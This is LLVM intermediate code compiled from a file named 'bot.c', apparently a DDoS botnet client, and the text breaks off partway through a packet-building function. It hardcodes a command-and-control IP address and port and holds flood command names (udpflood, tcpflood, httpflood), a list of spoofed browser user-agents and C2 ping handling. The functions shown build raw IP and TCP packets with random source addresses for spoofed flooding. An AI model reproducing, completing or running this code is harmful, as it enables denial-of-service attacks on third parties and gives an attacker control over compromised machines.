; ModuleID = 'bot.c'
source_filename = "bot.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@c2_bot_port = dso_local global i32 27, align 4
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@c2_http_host = dso_local global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), align 8
@numattackpids = dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@UserAgents = dso_local global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@attackpids = dso_local global i32* null, align 8
@retry = dso_local global i32 1, align 4
@retrys = dso_local global i32 3, align 4
@tryagain = dso_local global i32 1, align 4
@max_attacks = dso_local global i32 4, align 4
@maxboot_time = dso_local global i32 600, align 4
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@trigger = dso_local global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), align 8
@C2 = dso_local global i32 -1, align 4
@ioctl_pid = dso_local global i32 0, align 4
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@c2_host = dso_local global [16 x i8] zeroinitializer, align 16
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@Socket = dso_local global %struct.sockaddr_in zeroinitializer, align 4
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@buf = dso_local global [1024 x i8] zeroinitializer, align 16
@buffer = dso_local global i32 0, align 4
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@LOCAL_ADDR = dso_local global i32 0, align 4
@scanPid = dso_local global i32 0, align 4
@pongresponse = dso_local global [25 x i8] zeroinitializer, align 16

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_rand(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeRandomStr(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !8

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomIP(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @csum(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !9

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !10

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* %0, %struct.tcphdr* %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  store i32 24, i32* %7, align 4
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call noalias align 16 i8* @malloc(i64 %26) #11
  %28 = bitcast i8* %27 to i16*
  store i16* %28, i16** %8, align 8
  %29 = load i16*, i16** %8, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %30, i8* align 8 %31, i64 24, i1 false)
  %32 = load i16*, i16** %8, align 8
  %33 = bitcast i16* %32 to i8*
  %34 = getelementptr inbounds i8, i8* %33, i64 24
  %35 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %36 = bitcast %struct.tcphdr* %35 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %34, i8* align 1 %36, i64 20, i1 false)
  %37 = load i16*, i16** %8, align 8
  %38 = load i32, i32* %7, align 4
  %39 = call zeroext i16 @csum(i16* %37, i32 %38)
  store i16 %39, i16* %9, align 2
  %40 = load i16*, i16** %8, align 8
  %41 = bitcast i16* %40 to i8*
  call void @free(i8* %41) #11
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* %0, i32 %1, i32 %2, i8 zeroext %3, i32 %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
